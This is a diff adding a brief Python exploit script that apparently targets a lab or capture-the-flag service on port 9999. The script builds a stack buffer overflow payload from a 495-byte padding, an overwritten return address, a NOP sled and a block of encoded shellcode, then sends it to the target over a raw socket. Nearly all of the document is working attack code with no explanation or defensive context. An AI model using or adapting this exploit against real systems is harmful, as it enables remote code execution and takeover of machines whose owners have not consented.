@@ -1,0 +1,27 @@
+import socket
+import pwn
+
+shellcode =  b""
+shellcode += b"\xbf\x86\x17\xcc\x46\xdb\xdd\xd9\x74\x24\xf4\x5a\x29"
+shellcode += b"\xc9\xb1\x12\x31\x7a\x12\x03\x7a\x12\x83\x44\x13\x2e"
+shellcode += b"\xb3\x79\xc7\x59\xdf\x2a\xb4\xf6\x4a\xce\xb3\x18\x3a"
+shellcode += b"\xa8\x0e\x5a\xa8\x6d\x21\x64\x02\x0d\x08\xe2\x65\x65"
+shellcode += b"\x81\x1f\xb5\xe6\xfd\x1d\xb9\x08\xcb\xa8\x58\xb8\x55"
+shellcode += b"\xfb\xcb\xeb\x2a\xf8\x62\xea\x80\x7f\x26\x84\x74\xaf"
+shellcode += b"\xb4\x3c\xe1\x80\x15\xde\x98\x57\x8a\x4c\x08\xe1\xac"
+shellcode += b"\xc0\xa5\x3c\xae"
+
+offset = 495
+buffer = b"A" * offset + pwn.p32(0x7BCCE5D9) + b"\x90" * 32 + shellcode
+
+target = '10.10.108.143'
+#target = '127.0.0.1'
+port = 9999
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target, port))
+    s.send((b"                          >> " + buffer))
+    s.close()
+except:
+    print(f"Error connecting to the server...")
